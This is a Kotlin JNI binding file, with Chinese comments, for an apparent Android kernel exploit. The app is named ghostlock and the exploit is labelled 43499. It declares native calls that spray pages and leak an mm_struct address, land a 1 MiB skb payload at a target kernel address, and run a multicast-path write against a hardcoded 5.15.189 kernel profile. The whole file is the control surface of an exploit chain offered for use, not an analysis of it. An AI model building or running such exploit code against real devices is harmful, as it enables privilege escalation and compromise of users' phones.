package com.ghostlock.app.jni

/**
 * 43499 的 native 边界（`libghostlock43499.so`）。
 *
 * 只做标量搬运：策略、步骤顺序、重试与判定全部在 Kotlin（`Cve43499BackendPort`
 * 及其上层 Flow）；本对象不缓存状态，句柄由调用方持有。
 *
 * 调用序（一次写）：
 * ```
 * create() → discover(target) → land(mmStruct, target) → executeMulticast(target) → close()
 * ```
 * 也可以 `runMulticast(target)` 一次走完（仅用于与 native 直连路径对拍）。
 *
 * @note 会话是**单例**：`create` 重复调用返回 `-EALREADY`（-17）；`close` 幂等。
 * @note `discover → executeMulticast` 之间不允许有其它写，且必须在**同一后台线程**
 *       顺序调用（喷页状态是进程级单例）。
 * @note 全部调用阻塞；`discover` 内含喷页与 leak，通常 1–3 s。
 * @note 失败语义：`discover`/`land` 返回 0；`execute`/`run` 返回 0，
 *       原因用 [lastStep]/[lastErrno] 读。
 * @note profile 目前写死在 native（5.15.189 dev profile），`create` 不接受配置；
 *       profile blob 契约落地后本对象签名会变。
 */
internal object Native43499Jni {
    /** 会话已存在时的返回值（`-EALREADY`）。 */
    const val ALREADY_CREATED: Int = -17

    init {
        System.loadLibrary("ghostlock43499")
    }

    /**
     * 初始化单会话。
     *
     * @return 0 成功；负数为 `-errno`。
     */
    external fun create(): Int

    /**
     * 喷页 + 泄漏。
     *
     * @param target 目标地址的 direct-map 别名。
     * @return `mm_struct`；0 表示失败。
     */
    external fun discover(target: Long): Long

    /**
     * 用 `mm_struct` 落页。
     *
     * @param mmStruct [discover] 的返回值。
     * @param target   与 [discover] 相同的目标地址。
     * @return 页基址；0 表示拒绝或失败。
     */
    external fun land(mmStruct: Long, target: Long): Long

    /**
     * 与 [land] 相同，但页载荷字节由 Kotlin 提供（P-2 之后 Kotlin 负责构造）。
     *
     * @param mmStruct   [discover] 的返回值。
     * @param target     与 [discover] 相同的目标地址。
     * @param skbPayload 全量页载荷；长度必须等于 native 的 `SKB_SEND_SIZE`
     *                   （当前 1 MiB，由 `prepare_skb_payload` 决定）。
     * @return 页基址；0 表示拒绝（长度不符 / 页被拒收 / 地址不匹配）。
     */
    external fun landWithPayload(mmStruct: Long, target: Long, skbPayload: ByteArray): Long

    /**
     * 页载荷要求的字节数。
     *
     * @return native 的 `SKB_SEND_SIZE`（当前 1 MiB）；Kotlin 构造 `skbPayload` 时用它。
     */
    external fun skbPayloadSize(): Int

    /**
     * select 物理入口（保留面占位）。
     *
     * @param target 目标地址。
     * @return `-ENOSYS`：该 route 无自有真机门禁，未证明前一律拒绝。
     */
    external fun executeSelect(target: Long): Int

    /**
     * tcp 物理入口（保留面占位）。
     *
     * @param target 目标地址。
     * @return `-ENOSYS`：同上。
     */
    external fun executeTcp(target: Long): Int

    /**
     * 执行已落页的 multicast 单发。
     *
     * @param target 目标地址。
     * @return 1 成功；0 失败。
     */
    external fun executeMulticast(target: Long): Int

    /**
     * 一次完整写（discover + land + multicast），仅用于对拍。
     *
     * @param target 目标地址。
     * @return 1 成功；0 失败。
     */
    external fun runMulticast(target: Long): Int

    /** @return 最近一次 route step（0 = 无失败）。 */
    external fun lastStep(): Int

    /** @return 最近一次 errno（0 = 无失败）。 */
    external fun lastErrno(): Int

    /** 释放会话（幂等）。 */
    external fun close()
}
